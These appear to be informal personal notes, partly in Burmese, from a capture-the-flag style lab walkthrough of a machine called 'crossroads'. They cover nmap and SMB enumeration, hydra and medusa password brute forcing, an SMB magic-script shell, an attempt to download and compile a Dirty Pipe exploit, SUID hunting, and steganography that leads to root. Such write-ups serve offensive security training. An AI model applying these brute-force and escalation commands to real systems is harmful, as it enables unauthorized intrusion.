
nmap -sn 192.168.99.1/24 

nmap 192.168.99.28 

nmap -sC -sV 192.168.99.28

smbmap -H 192.168.99.28   => enumanate  => we got nothing

enum4linux 192.168.99.28   =>  we got username

![[Pasted image 20230114225608.png]]

nmap 192.168.99.28 --script=smb-enum-users -sV   => best one  => we got user too


![[Pasted image 20230114225639.png]]

-----

we try to get smb password with hydra tool

** hydra -l albert -P /usr/share/wordlists/rockyou.txt 192.168.99.28 smb -t 1

-t option for time => 1 request per time


** medusa -h 192.168.99.28 -u albert -P /usr/share/wordlists/rockyou.txt -M smbnt  => nice dal

Finally we get user name and paswrd 
username -> albert 
password -> bradley1

smbmap -H 192.168.99.28 -u albert -p 'bradley1'    => we are entering again

smbclient //192.168.99.28/albert -U albert    => we are going to albert folder

smbconf twe mar a ye kyi sone ka * magic script file bal* => cuzz auto run mot

![[Pasted image 20230115152519.png]]


subl smbscript.txt    => we create this file * file name must be same with magic script file*

=> smbshare folder htal ko win twar dal
smbclient //192.168.99.28/smbshare -U albert

![[Pasted image 20230115155526.png]]

rename smbscript.txt smbscript.sh  => we change txt file to sh file

 ######### we got user 

----

Rooting Time!!!!

mv smbscript.txt smbscript.sh     => Firstly we change txt file to sh file for exploit 


smbclient //192.168.99.28/smbshare -U albert      => go again to smb

put smbscript.sh     => shell file ko tin lite dar

We check kernel version and release date 

![[Pasted image 20230117215322.png]]

we are going to dirty pipe and take it directory for download

wget https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/blob/main/exploit-1.c

we found  exploit-1.c 

we run with gcc command
gcc exploit-1.c -o exploit

but we can't do nothing  **

======> we think another way

export TERM=linux    => we are using this command to use like a linux terminal

==> now we are going with SUID 

find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null   => ko root script

![[Pasted image 20230117220520.png]]

Something was wrong on upper image 

beroot ka binary file => we can run with ./

strings beroot    => we can also check with string command => in this case nothing was happen

cp beroot smbshare   => we are copy this file to smbshare cuzz we don't believe it

cp crossroads.png smbshare    => we copy this file too 

cd smbshare => go now and check it 

smbclient //192.168.99.28/smbshare -U albert   => go to smbshell file

get beroot => download

get crossroads.png => download

strings beroot  => binary file ko show dar  => in this cause we got nothing 

==> playint to beroot binary file

sudo -s

echo "" > /root/beroot.sh

./beroot  => in this cause we got nothing 

===> OK fine -> now we are going to server and try again

echo passwd
echo password | ./beroot    -> result = permission denided   

===> we also investigate image file 

binwalk crossroads.png   -> we saw zip file 
binwalk -e crossroads.png   => binwalk is just tool -> -e is extract 


---------> We try to us  stegoveritas 

stegoveritas crossroads.png 

we find result folder

and then we got password file 

we take both of this to our pj folder

and then go to the smbshare folder =>  smbclient //192.168.99.28/smbshare -U albert

put password.txt
put run.sh    -> that is we create for brute force with bash

![[Pasted image 20230119212345.png]]

but we cant run this script in smbshare folder -> cuz beroot env is not locate at smbsharefolder -> so we go to the user folder path

and then use ./run.sh

we found root crendital 

we got root ###### 



![[Pasted image 20230119212735.png]]


---







 


 









 

  

